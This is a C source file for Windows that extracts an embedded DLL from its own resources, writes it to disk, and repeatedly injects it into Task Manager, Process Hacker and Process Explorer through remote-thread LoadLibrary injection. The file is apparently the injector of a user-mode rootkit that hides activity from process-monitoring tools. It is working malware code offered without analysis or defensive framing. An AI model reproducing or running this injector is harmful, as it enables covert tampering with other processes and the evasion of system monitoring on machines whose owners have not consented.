#include "pa5a.hpp"

EXTERN_C_START

/********************************************************************************************************************************/
BOOL WritePa5aDll()
{
    HANDLE hDll = NULL;
    CHAR filename[PATH_SIZE] = { 0 };

    HRSRC myResource = FindResource(NULL, MAKEINTRESOURCE(IDR_RCDATA1), RT_RCDATA);
    DWORD myResourceSize = SizeofResource(NULL, myResource);
    HGLOBAL myResourceData = LoadResource(NULL, myResource);
    PVOID pMyBinaryData = LockResource(myResourceData);

    if (StringCbPrintfA(filename, sizeof(filename), "%s%s", DATA_FOLDER_A, DLL_FILE_A) != S_OK)
        return FALSE;

    if ((hDll = CreateFileA(filename, FILE_GENERIC_WRITE, 0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL)) == INVALID_HANDLE_VALUE)
        return FALSE;

    if (!WriteFile(hDll, pMyBinaryData, myResourceSize, NULL, NULL))
        return FALSE;

    CloseHandle(hDll);

    return TRUE;
}
/********************************************************************************************************************************/
BOOL inject(DWORD processId)
{
    STARTUPINFOA si = { 0 };
    PROCESS_INFORMATION pi = { 0 };
    HINSTANCE hKernel32 = NULL;
    LPVOID hLoadLibrary = NULL, free_library_function = NULL, pa5aDllAddress = NULL;
    HANDLE hRemoteThread = 0;
    HANDLE hProcess = NULL;
    CHAR pa5aDllPath[PATH_SIZE] = { 0 };

    if (StringCbPrintfA(pa5aDllPath, sizeof(pa5aDllPath), "%s%s", DATA_FOLDER_A, DLL_FILE_A) != S_OK)
        return FALSE;
    
    if (!(hProcess = MyOpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION, FALSE, processId)))
    {
        printf("OpenProcess error\nGetLastError(%d)\n", GetLastError());
        return FALSE;
    }

    if (!(hKernel32 = GetModuleHandle(L"Kernel32.dll")))
    {
        printf("GetModuleHandleA error\nGetLastError(%d)\n", GetLastError());
        CloseHandle(hProcess);
        return FALSE;
    }

    if (!(hLoadLibrary = GetProcAddress(hKernel32, "LoadLibraryA")))
    {
        printf("GetProcAddress error\nGetLastError(%d)\n", GetLastError());
        CloseHandle(hProcess);
        return FALSE;
    }

    if (!(pa5aDllAddress = MyVirtualAllocEx(hProcess, 0, strlen(pa5aDllPath) + 1, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE)))
    {
        printf("VirtualAllocEx error\nGetLastError(%d)\n", GetLastError());
        CloseHandle(hProcess);
        return FALSE;
    }

    if (!MyWriteProcessMemory(hProcess, pa5aDllAddress, pa5aDllPath, strlen(pa5aDllPath), NULL))
    {
        printf("WriteProcessMemory error\nGetLastError(%d)\n", GetLastError());
        CloseHandle(hProcess);
        return FALSE;
    }
    
    if (!(hRemoteThread = MyCreateRemoteThread(hProcess, NULL, NULL, (PTHREAD_START_ROUTINE)hLoadLibrary, pa5aDllAddress, NULL, NULL)))
    {
        printf("CreateRemoteThread error\nGetLastError(%d)\n", GetLastError());
        CloseHandle(hProcess);
        return FALSE;
    }

    CloseHandle(hProcess);
    return TRUE;
}
/********************************************************************************************************************************/
DWORD GetProcessIdFormProcessName(LPCWSTR processName)
{
    HANDLE hSnapshot = NULL;
    DWORD processId = -1;
    
    if (!(hSnapshot = MyCreateToolhelp32Snapshot(TH32CS_SNAPPROCESS | TH32CS_SNAPMODULE, 0)))
        return -1;

    PROCESSENTRY32W process = { sizeof(PROCESSENTRY32) };
    MyProcess32FirstW(hSnapshot, &process);
    
    do
    {
        if (wcsstr(process.szExeFile, processName))
        {
            //wprintf(L"%d, %s\n", process.th32ProcessID, process.szExeFile);
            processId = process.th32ProcessID;
            break;
        }

    } while (MyProcess32NextW(hSnapshot, &process));

    CloseHandle(hSnapshot);
    return processId;
}
/********************************************************************************************************************************/
VOID checkProcessForDllInjection(ProcessForDllInjection* infos, LPCWSTR processName)
{
    if ((infos->processId = GetProcessIdFormProcessName(processName)) != -1)
    {
        if (infos->running == FALSE)
        {
            if (inject(infos->processId))
            {
                infos->running = TRUE;
                wprintf(L"DLL injection in %ls -> OK\n", processName);
            }
        }
    }
    else
        infos->running = FALSE;
}
/********************************************************************************************************************************/
DWORD WINAPI ThreadInjector()
{
    ProcessForDllInjection taskManager = { 0 };
    ProcessForDllInjection processHacker = { 0 };
    ProcessForDllInjection processExplorer64 = { 0 };
    
    while (TRUE)
    {
        checkProcessForDllInjection(&taskManager, L"Taskmgr.exe");
        checkProcessForDllInjection(&processHacker, L"ProcessHacker.exe");
        checkProcessForDllInjection(&processExplorer64, L"procexp64.exe");
        Sleep(10);
    }

    ExitThread(0);
}
/********************************************************************************************************************************/

EXTERN_C_END